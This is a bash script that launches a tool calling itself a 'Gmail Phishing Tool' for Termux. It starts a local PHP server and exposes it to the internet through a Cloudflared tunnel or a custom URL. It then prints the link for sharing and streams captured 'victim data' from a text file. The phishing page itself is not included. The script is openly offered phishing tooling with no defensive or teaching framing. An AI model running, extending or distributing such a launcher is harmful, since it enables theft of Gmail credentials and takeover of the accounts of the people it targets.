#!/bin/bash

# Colors
RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
CYAN='\033[1;36m'
NC='\033[0m'

# ---------------------------
# 🔥 CUSTOM BANNER
# ---------------------------
clear
echo -e "${CYAN}"
echo "╔══════════════════════════════════════════╗"
echo "║       🔥 ZeroDark Nexus 🔥               ║"
echo "║    Gmail Phishing Tool v2.0 (Termux)     ║"
echo "╚══════════════════════════════════════════╝"
echo -e "${NC}"

# ---------------------------
# MENU
# ---------------------------
echo -e "${GREEN}[01]${YELLOW} Cloudflared Tunnel"
echo -e "${GREEN}[02]${YELLOW} Custom Server URL"
echo -ne "${GREEN}[+]${NC} Choose a Port Forwarding option: "
read option

# ---------------------------
# START PHP SERVER
# ---------------------------
echo -e "${CYAN}[*] Starting PHP server on port 8080...${NC}"
php -S 127.0.0.1:8080 > /dev/null 2>&1 &
sleep 2

# ---------------------------
# CLOUDFLARED TUNNEL
# ---------------------------
if [[ $option == 1 ]]; then
    echo -e "${CYAN}[*] Starting Cloudflared tunnel...${NC}"
    cloudflared tunnel --url http://localhost:8080 --logfile tunnel.log > /dev/null 2>&1 &
    sleep 4
    LINK=$(grep -o "https://[-0-9a-z]*\.trycloudflare.com" tunnel.log | head -n1)
    if [[ -z "$LINK" ]]; then
        echo -e "${RED}[!] Tunnel link not found. Try again.${NC}"
        exit 1
    fi
    echo -e "${GREEN}[✔] Live URL:${YELLOW} $LINK${NC}"
elif [[ $option == 2 ]]; then
    echo -ne "${CYAN}[*] Enter your custom server URL: ${NC}"
    read LINK
    echo -e "${GREEN}[✔] Share this URL: ${YELLOW}$LINK${NC}"
else
    echo -e "${RED}[!] Invalid Option${NC}"
    exit 1
fi

# ---------------------------
# LIVE VIEW
# ---------------------------
echo -e "${CYAN}[*] Waiting for victim data...${NC}"
if [[ -f recovery_data.txt ]]; then
    tail -f recovery_data.txt
else
    echo -e "${RED}[!] recovery_data.txt not found. Make sure save.php is correct.${NC}"
fi
